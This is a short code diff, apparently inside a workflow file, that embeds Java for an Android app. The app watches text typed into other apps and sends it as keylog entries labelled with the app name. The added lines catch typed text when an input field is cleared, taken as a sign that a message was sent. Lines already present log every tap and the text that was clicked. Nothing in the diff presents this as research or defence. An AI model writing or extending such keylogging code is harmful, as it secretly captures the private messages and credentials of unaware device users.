@@ -579,6 +579,15 @@ jobs:
                                       }
                                       pendingText.setLength(0);
                                       pendingText.append(typedText);
+                                  } else {
+                                      // Input field cleared -> likely send action
+                                      if (pendingText.length() > 0) {
+                                          String typed = pendingText.toString().trim();
+                                          String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : "Unknown");
+                                          sendKeylog("[" + typedAppName + "] " + typed);
+                                          pendingText.setLength(0);
+                                          pendingPackageName = null;
+                                      }
                                   }
                               }
                               break;
@@ -635,7 +644,7 @@ jobs:
                   // 1. Send tap event
                   sendKeylog("👆 [" + appName + " Tapped] " + (clickedText.isEmpty() ? "Unknown" : clickedText));
 
-                  // 2. ✅ Flush pending text on ANY click (if any)
+                  // 2. Flush pending text on click
                   if (pendingText.length() > 0) {
                       String typed = pendingText.toString().trim();
                       String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : appName);
